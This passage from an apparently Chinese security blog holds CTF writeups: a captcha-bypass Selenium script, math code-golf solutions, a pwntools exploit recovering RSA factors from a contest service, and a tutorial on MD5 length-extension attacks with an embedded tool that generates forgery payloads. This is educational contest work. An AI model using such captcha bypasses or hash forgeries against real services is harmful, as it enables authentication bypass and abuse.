s.get(q2_url)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;index.html&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> home:<br>    home.write(res.text)<br><br>data = &#123;<span class="hljs-string">&quot;response&quot;</span>: <span class="hljs-string">&quot;&quot;</span>&#125;<br>_<span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;&lt;input type=&quot;hidden&quot; name=&quot;ts&quot; value=&quot;(\d+)&quot;&gt;&#x27;</span>, res.text)<br>data[<span class="hljs-string">&quot;ts&quot;</span>] = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> _<span class="hljs-keyword">match</span>:<br>    data[<span class="hljs-string">&quot;ts&quot;</span>] = <span class="hljs-built_in">int</span>(_<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))<br>_<span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;&lt;input type=&quot;hidden&quot; name=&quot;certificate&quot; value=&quot;([0-9a-f]+)&quot;&gt;&#x27;</span>, res.text)<br>data[<span class="hljs-string">&quot;certificate&quot;</span>] = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> _<span class="hljs-keyword">match</span>:<br>    data[<span class="hljs-string">&quot;certificate&quot;</span>] = _<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br><br>browser = webdriver.Edge()<br>browser.get(localhost)<br>time.sleep(<span class="hljs-number">2</span>)<br><br>els = browser.find_elements(By.XPATH, <span class="hljs-string">&quot;//div[@id=&#x27;centralNoiseContainer&#x27;]/div[@id=&#x27;centralNoiseContent1&#x27;]/span&quot;</span>)<br>ans = []<br><span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> els:<br>    el_id = el.get_attribute(<span class="hljs-string">&quot;id&quot;</span>)<br>    ans.append(browser.execute_script(<span class="hljs-string">f&quot;return window.getComputedStyle(document.querySelector(&#x27;#<span class="hljs-subst">&#123;el_id&#125;</span>&#x27;), &#x27;:before&#x27;).getPropertyValue(&#x27;content&#x27;)&quot;</span>))<br>    ans.append(browser.execute_script(<span class="hljs-string">f&quot;return window.getComputedStyle(document.querySelector(&#x27;#<span class="hljs-subst">&#123;el_id&#125;</span>&#x27;), &#x27;:after&#x27;).getPropertyValue(&#x27;content&#x27;)&quot;</span>))<br>captcha = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> s: s.replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>), ans))<br>data[<span class="hljs-string">&quot;response&quot;</span>] = captcha<br><br>res = s.post(q2_url, data=data)<br><span class="hljs-built_in">print</span>(res.text)<br><br>s.close()<br>time.sleep(<span class="hljs-number">5</span>)<br>browser.close()<br></code></pre></td></tr></table></figure><blockquote><p>PS：有群友说 <code>Ctrl + s</code> 就行了，好像……真的是这样的。</p><p>PPS：有群友说 Firefox可以无视反调试代码开控制台，如果是真的话……唉，当初抛弃你是我的不对。</p></blockquote><h2 id="algo-codegolf-素数判断函数">algo-codegolf (素数判断函数)</h2><p>因为只要检测500以内的素数，那么一次<ahref="https://oi-wiki.org/math/number-theory/prime/#fermat-%E7%B4%A0%E6%80%A7%E6%B5%8B%E8%AF%95">费马素性测试</a>即可（回顾了一遍原理发现我写的不是费马素性检验，但是费马小定理是用上了）。这里需要爆破检测用的<span class="math inline">\(a\)</span>，使得当且仅当 <spanclass="math inline">\(n\)</span> 为素数时，<spanclass="math inline">\(a^{n-1}\equiv 1(\mathrm{mod}\ n)\)</span>成立。写个代码来爆破 <span class="math inline">\(a\)</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> sieve_base<br><br>primes = []<br><span class="hljs-keyword">for</span> prime <span class="hljs-keyword">in</span> sieve_base:<br>    <span class="hljs-keyword">if</span> prime &gt; <span class="hljs-number">500</span>:<br>        <span class="hljs-keyword">break</span><br>    primes.append(prime)<br><br>a = <span class="hljs-number">2</span><br>flag = <span class="hljs-literal">False</span><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> flag:<br>    flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">500</span>):<br>        i = <span class="hljs-built_in">pow</span>(a, p-<span class="hljs-number">1</span>, p)<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> p <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> primes:<br>            flag = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> i != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> p <span class="hljs-keyword">in</span> primes:<br>            flag = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> flag:<br>        <span class="hljs-built_in">print</span>(a)<br>        <span class="hljs-keyword">break</span><br>    a += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>得到 <span class="math inline">\(a =10103\)</span>，然后就是费马素性检验，<spanclass="math inline">\(10103^{n-1}\equiv 1(\mathrm{mod}\n)\)</span>，对于素数 <span class="math inline">\(n\)</span>成立，对于非素数 <span class="math inline">\(n\)</span>，因为 10103是素数，所以模小于500的 <spanclass="math inline">\(n\)</span>，值一定不是0。那么如何将1和大于1的值映射到1和0呢？用1整除就好了。所以最终函数为：<code>1//(10103**(n-1)%n)</code></p><h2 id="algo-codegolf-pell">algo-codegolf (Pell)</h2><p>这个想了好久，看了提示才出来的。<ahref="https://blog.paulhankin.net/fibonacci/">提示</a>的博客写得非常好，有机会的话恶补一下生成函数。直接开始公式推导吧。</p><p>对于 Pell 数列，其递推公式为：</p><p><span class="math display">\[P_{n}=\left\{ \begin{align}    &amp;0 &amp;,n=1 \\    &amp;1 &amp;,n=2 \\  &amp;2P_{n-1}+P_{n-2}&amp;,n&gt;2\end{align}\right.\]</span></p><p>对于第 <span class="math inline">\(i\)</span> 项等式，两边同乘以<span class="math inline">\(x^{i+1}\)</span>，即<spanclass="math inline">\(P_{i+2}x^{i+1} = 2P_{i+1}x^{i+1} +P_{i}x^{i+1}\)</span>，然后累加前 <span class="math inline">\(n\)</span>项等式，得到</p><p><span class="math display">\[\sum_{i=1}^nP_{i+2}x^{i+1} =2\sum_{i=1}^nP_{i+1}x^{i+1} + \sum_{i=1}^nP_{i}x^{i+1}\]</span></p><p>令 <spanclass="math inline">\(\mathcal{P}_n(x)=\sum_{i=1}^nP_{i}x^{i-1}\)</span>，则上述等式可以写为：</p><p><span class="math display">\[\begin{align}\mathcal{P}_{n+2}(x)-P_2x-P_1 &amp;= 2x(\mathcal{P}_{n+1}(x)-P_1) +x^2\mathcal{P}_{n}(x) \\\mathcal{P}_{n+2}(x)-x &amp;= 2x\mathcal{P}_{n+1}(x) +x^2\mathcal{P}_{n}(x)\end{align}\]</span></p><p>也许这里就是生成函数的特殊之处，认为这里的求和是收敛的，即 <spanclass="math inline">\(\lim_{n\to\infty}\mathcal{P}_{n}(x) =\mathcal{P}(x)\)</span>。<del>好吧，感觉有点道理，先这么认为了。</del></p><blockquote><p>因为 <span class="math inline">\(P_i &lt;4^i\)</span>，所以该函数一定小于一个等比数列求和，那么只要让 <spanclass="math inline">\(x &lt;\frac{1}{4}\)</span>，即在收敛半径中，这个幂级数就一定收敛</p></blockquote><p>那么通过上述等式，得到：</p><p><spanclass="math display">\[\mathcal{P}(x)=\frac{x}{1-2x-x^2}\]</span></p><p>用Python验证一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>P = <span class="hljs-keyword">lambda</span> x: x/(<span class="hljs-number">1</span>-<span class="hljs-number">2</span>*x-x**<span class="hljs-number">2</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>P(<span class="hljs-number">1e-3</span>)<br><span class="hljs-number">0.0010020050120290703</span><br></code></pre></td></tr></table></figure><p>不难发现，这里小数部分展示了 Pell 数的 2 至 7 项，原因是：</p><p><spanclass="math display">\[\mathcal{P}(10^{-3})=\sum_{i=1}^{\infty}10^{-3(i-1)}P_i\]</span></p><p>那么，<span class="math inline">\(P_i\equiv \lfloor10^{3(i-1)}\mathcal{P}(10^{-3})\rfloor (\mathrm{mod}\10^3)\)</span>，注意到这里模数要比 <spanclass="math inline">\(P_i\)</span> 大，不然就只能得到模数了。而 Pell数的通项公式为：</p><p><spanclass="math display">\[P_n=\frac{(1+\sqrt{2})^n-(1-\sqrt{2})^n}{2\sqrt{2}}\]</span></p><p>所以，<span class="math inline">\(P_n &lt; 4^{n+1}\)</span>。令 <spanclass="math inline">\(x = 4^{-i-1}\)</span>，则</p><p><span class="math display">\[\begin{align}P_i &amp;\equiv \lfloor 4^i\mathcal{P}(4^{-i-1})\rfloor (\mathrm{mod}\4^{i+1}) \\P_i &amp;= \lfloor \frac{4^i*4^{-i-1}}{1-2*4^{-i-1}-4^{-2i-2}} \rfloor(\mathrm{mod}\ 4^{i+1}) \\&amp;= \lfloor \frac{4^i*4^{i+1}}{4^{2i+2} - 2*4^{i+1} - 1} \rfloor(\mathrm{mod}\ 4^{i+1}) \\&amp;= \lfloor \frac{4^{i^2+i}}{16*16^i - 8*4^i - 1} \rfloor(\mathrm{mod}\ 4*4^i)\end{align}\]</span></p><p>写成 Python代码为：<code>4**(n*n+n)//(16*16**n-8*4**n-1)%(4*4**n)</code></p><h2 id="不经意传输简单开个锁">不经意传输(🗝简单开个锁️)</h2><p>想到了一点，但就是一点，后面结合提示瞪公式的时候找到了关键点。</p><h3 id="题面">题面</h3><p><code>FROM RSA:classic</code></p><p>已知 <span class="math inline">\(p, q, n=pq, e=65537, d\equive^{-1}(\mathrm{mod}\ \varphi(n)), x_0, x_1\)</span>，其中 <spanclass="math inline">\(p\)</span> 和 <spanclass="math inline">\(q\)</span> 为素数，<spanclass="math inline">\(\varphi(n)\)</span> 为欧拉函数，<spanclass="math inline">\(x_0\)</span> 和 <spanclass="math inline">\(x_1\)</span> 为小于 <spanclass="math inline">\(n\)</span> 的随机数。对于给定 <spanclass="math inline">\(v\)</span>，已知</p><p><span class="math display">\[\left\{\begin{align}v_0 \equiv ((v-x_0)^d+(p+q)^d+f)(\mathrm{mod}\ n) \\v_1 \equiv ((v-x_1)^d+(p-q)^d+f)(\mathrm{mod}\ n)\end{align}\right.\]</span></p><p>求解 <span class="math inline">\(f\)</span>的值（注意，这里只能获取一次 <span class="math inline">\(v_0\)</span> 和<span class="math inline">\(v_1\)</span>）</p><p>令 <span class="math inline">\(v = x_1\)</span>，因为 <spanclass="math inline">\(d\)</span> 为奇数，而 <spanclass="math inline">\((p\pm q)^d\)</span> 的中间项至少包含一个 <spanclass="math inline">\(pq=n\)</span>，所以被模除了，只剩下 <spanclass="math inline">\(p^d\pm q^d\)</span></p><p><span class="math display">\[v_0-v_1 \equiv ((x_1-x_0)^d + 2q^d)(\mathrm{mod}\ n)\]</span></p><p>第一阶段就卡在这里了，第二阶段根据提示才找到后面的做法</p><p><span class="math display">\[\begin{align}(v_0-v_1)^e &amp;\equiv ((x_1-x_0)^d + 2q^d)^e(\mathrm{mod}\ n) \\&amp;\equiv ((x_1-x_0) + Kq)(\mathrm{mod}\ n) (K\in \mathbb{Z})\end{align}\]</span></p><p>那么 <spanclass="math inline">\(((v_0-v_1)^e-(x_1-x_0))(\mathrm{mod}\ n)\)</span>能被 <span class="math inline">\(q\)</span> 整除，这样只需要求 <spanclass="math inline">\(gcd(((v_0-v_1)^e-(x_1-x_0))(\mathrm{mod}\ n),n)\)</span>，就能求出 <span class="math inline">\(q\)</span>了。然后后面就求出 <span class="math inline">\(p,d\)</span>，求出 <spanclass="math inline">\(f\)</span> 了。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>token = <span class="hljs-string">&quot;&lt;your_token&gt;&quot;</span><br><br>p = remote(<span class="hljs-string">&quot;prob07.geekgame.pku.edu.cn&quot;</span>, <span class="hljs-number">10007</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;token: &quot;</span>)<br>p.sendline(token.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;level[1/2]: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>n   = <span class="hljs-built_in">int</span>(p.recvline().decode().strip().replace(<span class="hljs-string">&quot;n = &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>e   = <span class="hljs-built_in">int</span>(p.recvline().decode().strip().replace(<span class="hljs-string">&quot;e = &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>x0  = <span class="hljs-built_in">int</span>(p.recvline().decode().strip().replace(<span class="hljs-string">&quot;x0 = &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>x1  = <span class="hljs-built_in">int</span>(p.recvline().decode().strip().replace(<span class="hljs-string">&quot;x1 = &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>p.recvuntil(<span class="hljs-string">b&quot;v = &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(x1).encode())<br>p.recvline()<br>v0  = <span class="hljs-built_in">int</span>(p.recvline().decode().strip().replace(<span class="hljs-string">&quot;v0 = &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>v1  = <span class="hljs-built_in">int</span>(p.recvline().decode().strip().replace(<span class="hljs-string">&quot;v1 = &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>p.close()<br><br>q   = gcd((<span class="hljs-built_in">pow</span>(v0-v1, e, n) - (x1-x0))%n, n)<br><span class="hljs-keyword">assert</span> q != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> n%q == <span class="hljs-number">0</span><br>p   = n//q<br>d   = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>f   = (v1 - <span class="hljs-built_in">pow</span>(p, d, n) + <span class="hljs-built_in">pow</span>(q, d, n))%n<br><span class="hljs-built_in">print</span>(long_to_bytes(f))<br></code></pre></td></tr></table></figure><hr /><p>速速去写论文！！！😵</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
      <category>竞赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>长度扩展攻击</title>
    <link href="/2024/08/30/ctf/notes/length-extension-attack/"/>
    <url>/2024/08/30/ctf/notes/length-extension-attack/</url>
    
    <content type="html"><![CDATA[<p>Hash长度扩展攻击：已知明文长度和明文的杂凑值，但明文本身未知，通过构造扩展消息，可以计算出明文连接扩展消息的杂凑值。</p><span id="more"></span><h2 id="引言">引言</h2><p>在 BaseCTF 第二周遇到的一道题目，题目部分如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>&#125;<br><br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span class="hljs-string">&#x27;user&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不是管理员也来凑热闹?&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$md5</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span> . <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;伪造? NO NO NO!&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里给出了一个96字节的明文，但是内容未知。然后给出这个明文的 MD5值。然后要求你附加一段文字，文字以 <code>admin</code>结尾，使得明文加上附加文字的 MD5 能被求出来。这里就设计到了本文介绍的Hash 长度扩展攻击。</p><p>本文在介绍部分就以 MD5 来介绍 Hash 长度扩展攻击，实际上SHA1，SHA2的算法也都受该攻击的影响，只是影响的方式都大同小异，相信聪明的你举一反三就一定会了。</p><h2 id="md5-算法">MD5 算法</h2><p>该攻击过程是杂凑函数填充过程中由于自身的逻辑导致的，所以在以 MD5为例子介绍 Hash 长度扩展攻击前，我们来看一下 MD5算法的具体实现过程。</p><figure><img src="./MD5.svg" alt="MD5 实现" /><figcaption aria-hidden="true">MD5 实现</figcaption></figure><p>上图展示了 MD5 算法的过程，我们从上至下、从左至右地看这张图。</p><h3 id="填充">填充</h3><p>MD5的第一步就是对明文进行填充，使得其长度为512比特的倍数，从而可以切分成长为64字节（等于512比特，下面都用字节来表示了）的分组。那么填充什么呢？</p><p>按照 <a href="https://www.ietf.org/rfc/rfc1321.txt">RFC1321</a>的标准</p><ol type="1"><li>在明文末尾填充 <code>0x80</code> （1字节）</li><li>在最后一个分组的最后8字节填充明文的长度，<strong>注意！！！这里用的比特长度，所以字节要乘以8</strong>（8字节）</li><li>其余部分填充 <code>0x00</code></li></ol><p>来点小练习：</p><blockquote><p>Q1：假如最后一个分组长度为32字节，填充多少 <code>0x00</code>（仅限<code>0x00</code> 填充部分，下同）？</p><p>A1：64-32-1-8 = 23字节</p></blockquote><blockquote><p>Q2：假如最后一个分组长度为56字节，填充多少 <code>0x00</code>？</p><p>A2：64-56-1-8 = -1字节？如果填了 <code>0x80</code>后填不下长度，那么就新开一个分段填充长度，所以是 63 字节。</p></blockquote><blockquote><p>Q3：假如最后一个分组长度为55字节，填充多少 <code>0x00</code>？</p><p>A3：64-55-1-8 = 0字节，刚刚好！</p></blockquote><h3 id="分组计算">分组计算</h3><p>这里我不想赘述 MD5 中对每个分组中计算的具体过程，如果好奇可以看 <ahref="https://www.ietf.org/rfc/rfc1321.txt">RFC1321</a>标准，或者其他博客。我们只需要将这段过程记为 <spanclass="math inline">\(\textbf{H}_C(\textbf{B_i},\textbf{V})\)</span>，其中 <span class="math inline">\(\textbf{B_i}\)</span>是明文的当前分组，<span class="math inline">\(\textbf{V}\)</span>是一个向量，有一个初始值。对所有的分组计算完成后，<spanclass="math inline">\(\textbf{V}\)</span> 就是该段明文的 MD5杂凑值。那么 MD5 计算方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">MD5</span>:<br>    V = IV<br>    <span class="hljs-keyword">for</span> B_i <span class="hljs-keyword">in</span> B:<br>        _V = H_C(B_i, V)<br>        V += _V<br>    <span class="hljs-keyword">return</span> V<br></code></pre></td></tr></table></figure><h2 id="md5-长度扩展攻击">MD5 长度扩展攻击</h2><p>下面介绍攻击过程，先看下图：</p><figure><img src="./LEA.svg" alt="长度扩展攻击" /><figcaption aria-hidden="true">长度扩展攻击</figcaption></figure><p>名词量爆炸，不是吗？捋一下相关的名词：</p><ul><li>原填充：明文在计算 MD5 过程中的填充</li><li>扩展消息：你希望添加的消息，但是<strong>请注意</strong>，这里的扩展消息并不是直接添加在明文后面的</li><li>伪造消息：等于原填充+扩展消息，这才是直接添加在明文后面的内容</li><li>扩展填充：将明文+伪造消息变为一个新的明文，为计算新明文的 MD5而添加的填充</li></ul><p>可以看到，扩展填充里面的长度为<code>明文+(原填充+扩展消息) = 明文+伪造消息</code> 的总长度。</p><p>老规律，还是来点例题（你不给例题我知道题怎么做啊）</p><blockquote><p>Q1：明文长为96字节，扩展消息长为5字节，请问扩展填充中有多少<code>0x00</code>，长度为多少？</p><p>A1：首先计算原填充，一看1+23+8=32字节，总消息长为96+32+5=133字节，最后一个分组5字节，填充50个<code>0x00</code>，长度为133*8=1064</p></blockquote><blockquote><p>Q2：明文长为55字节，扩展消息长为120字节，请问扩展填充中有多少<code>0x00</code>，长度为多少？</p><p>A2：首先计算原填充，一看1+0+8=9字节，总消息长为55+9+120=184字节，最后一个分组56字节，填充63个<code>0x00</code>，长度为184*8=1472</p></blockquote><blockquote><p>Q3：明文长为56字节，扩展消息长为0字节，请问扩展填充中有多少<code>0x00</code>，长度为多少？</p><p>A3：首先计算原填充，一看1+63+8=72字节，总消息长度为56+72+0=128字节，最后一个分组为64字节，填充55个<code>0x00</code>，长度为128*8=1024</p></blockquote><h3 id="计算结果">计算结果</h3><p>相信明白图1和图2后，聪明的你已经知道该怎么计算添加扩展消息后的 MD5值了吧。如下图：</p><figure><img src="./LEA_Algo.svg" alt="长度扩展攻击过程" /><figcaption aria-hidden="true">长度扩展攻击过程</figcaption></figure><p>我们将明文 MD5 值作为向量的初始值 <spanclass="math inline">\(\textbf{V}\)</span>，然后把<code>伪造消息+扩展填充</code> 每64字节分成一组 <spanclass="math inline">\(\textbf{B_i}\)</span>，送到 <spanclass="math inline">\(\textbf{H}_C(\textbf{B_i},\textbf{V})\)</span>中，就得到了扩展后的 MD5 值。</p><h2 id="小工具">小工具</h2><p>这里我写了一个小工具来生成你需要的攻击负载以及对应的杂凑值。（但愿它没有问题）</p><div id="app">  <ul class="nav nav-tabs" id="hash-algo" role="tablist">    <li class="nav-item m-0" role="presentation">      <button class="nav-link active" id="md5-tab" data-toggle="tab" data-target="#md5" type="button" role="tab" aria-controls="home" aria-selected="true">MD5</button>    </li>    <li class="nav-item m-0" role="presentation">      <button class="nav-link" id="sha1-tab" data-toggle="tab" data-target="#sha1" type="button" role="tab" aria-controls="profile" aria-selected="false">SHA1</button>    </li>  </ul>  <div class="tab-content mt-2" id="myTabContent">    <div class="tab-pane fade show active" id="md5" role="tabpanel" aria-labelledby="home-tab">      <div class="form-group mb-3">        <label class="mb-2" for="msg-md5">原文MD5</label>        <input type="text" class="form-control" :class="{ 'is-invalid': !isValidMd5 }" v-model="msgMd5" id="msg-md5">        <div v-if="!isValidMd5" class="invalid-feedback">请输入正确的十六进制的 MD5 值</div>      </div>      <div class="form-group mb-3">        <label class="mb-2" for="msg-length">原文长度（字节）</label>        <input type="number" class="form-control" v-model="msgLength" id="msg-length">      </div>      <div class="form-group mb-3">        <label class="mb-2" for="extension">附加信息</label>        <div class="input-group" id="extension">          <input type="text" class="form-control" v-model="extension">          <select class="custom-select col-3" v-model="extensionEncode">            <option disabled value="">编码方式</option>            <option value="utf8">UTF-8</option>            <option value="hex">Hex</option>          </select>        </div>      </div>      <div class="form-group mb-3">        <label class="mb-2" for="lea-payload-output">扩展攻击负载</label>        <div class="input-group" id="lea-payload-output">          <input type="text" readonly class="form-control" v-model="leaPayload">          <select class="custom-select col-3" v-model="leaPayloadEncode">            <option disabled value="">编码方式</option>            <option value="hex">Hex</option>            <option value="b64">Base64</option>            <option value="url">UrlEncode</option>          </select>        </div>      </div>      <div class="form-group mb-3">        <label class="mb-2" for="lea-md5-output">攻击结果</label>        <input type="text" readonly class="form-control" v-model="leaMd5" id="lea-md5-output">      </div>    </div>    <div class="tab-pane fade" id="sha1" role="tabpanel" aria-labelledby="profile-tab">以后再说吧</div>  </div></div><script type="module">  import { MD5, toHex, fromHex, Base64 } from './length-extension-attack.js'  import { createApp } from 'https://unpkg.com/vue@3/dist/vue.esm-browser.js'  const encoder = new TextEncoder();  const decoder = new TextDecoder("utf-8");  createApp({    data() {      return {        msgMd5: "",        msgLength: 0,        extension: "",        extensionEncode: "",        leaPayloadEncode: "",      }    },    computed: {      isValidMd5() {        return /^[0-9a-fA-F]{32}$/gm.test(this.msgMd5);      },      encExtension() {        switch (this.extensionEncode) {          case "utf8":            return encoder.encode(this.extension);          case "hex":            return fromHex(this.extension);          default:            return new Uint8Array(0);        }      },      leaPayload() {        if (this.isValidMd5) {          let payload = MD5.lengthExtensionAttackPayloadGen(            this.msgLength,            this.encExtension          );          switch (this.leaPayloadEncode) {            case "b64":              return Base64.b64encode(payload);            case "url":              return Array.from(payload).map(                byte => encodeURI(String.fromCharCode(byte))              ).join("");            default:              return toHex(payload);          }        } else {          return "";        }      },      leaMd5() {        if (this.isValidMd5) {          return MD5.lengthExtensionAttackHexDigest(            this.msgMd5,            this.msgLength,            this.encExtension          );        } else {          return "";        }      }    }  }).mount("#app");</script>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
      <category>竞赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BaseCTF 2024 Week1 Writeup</title>
    <link href="/2024/08/21/ctf/basectf2024/week1/"/>
    <url>/2024/08/21/ctf/basectf2024/week1/</url>
    
    <content type="html"><![CDATA[<p>BaseCTF 2024 第一周赛题的 WP，热身赛捏。</p><span id="more"></span><p>在小羽网安的公众号看到的，本来毕设已经很焦虑了，但是就是主打一个主次不分。</p><h2 id="misc">Misc</h2><h3 id="根本进不去啊">根本进不去啊!</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dig -t TXT flag.basectf.fun<br></code></pre></td></tr></table></figure><h3 id="海上遇到了鲨鱼">海上遇到了鲨鱼</h3><img src="/2024/08/21/ctf/basectf2024/week1/misc_wireshark.png" class="" title="Wireshark 分析包"><p>复制文本然后执行以下 Python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;flag&gt;&quot;</span>[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h3 id="正着看还是反着看呢">正着看还是反着看呢？</h3><img src="/2024/08/21/ctf/basectf2024/week1/misc_flagorgalf.png" class="" title="hex 分析"><p>看到最后是一个 JFIF 的倒着写，执行下面的 Python 脚本将文件倒过来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 